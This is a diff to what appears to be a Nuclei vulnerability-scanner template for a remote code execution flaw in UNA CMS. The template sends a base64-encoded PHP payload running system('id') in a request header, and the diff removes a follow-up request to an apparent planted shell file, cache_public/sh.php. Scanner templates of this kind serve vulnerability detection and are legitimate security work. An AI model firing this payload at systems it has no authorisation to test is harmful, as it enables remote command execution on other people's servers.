@@ -15,12 +15,14 @@ info:
     - https://karmainsecurity.com/KIS-2025-01
   metadata:
     verified: true
-    max-request: 3
+    max-request: 2
     fofa-query: body="Powered by UNA"
   tags: una-cms,php,rce,vuln
 
 variables:
   cmd: "echo '{{randstr}}'. system('id') . '{{randstr}}';"
+
+flow: http(1) && http(2)
 
 http:
   - raw:
@@ -45,22 +47,18 @@ http:
         X-Requested-With: XMLHttpRequest
         X: {{base64(cmd)}}
 
-      - |
-        GET /cache_public/sh.php HTTP/1.1
-        Host: {{Hostname}}
-        X-Requested-With: XMLHttpRequest
-        X: {{base64(cmd)}}
-
-    stop-at-first-match: true
+    matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - 'Expires'
-          - 'Value'
+          - '{{randstr}}'
           - 'uid='
-          - 'groups='
         condition: and
+
+      - type: status
+        status:
+          - 200
 
     extractors:
       - type: regex
@@ -69,5 +67,5 @@ http:
         name: id
         group: 1
         regex:
-          - '{{randstr}}(.*){{randstr}}'
+          - '(?s){{randstr}}(.*?){{randstr}}'
 # digest: 4a0a00473045022029ec684aa03ff28a945a2b1c35c94c1666a69d123d0b7605bf690f81c1b644d70221008d40ff17baeeaf4161e36ec0200cb3b1c330922b579af156ece0c5aac4512c0a:922c64590222798bb761d5b6d8e72950
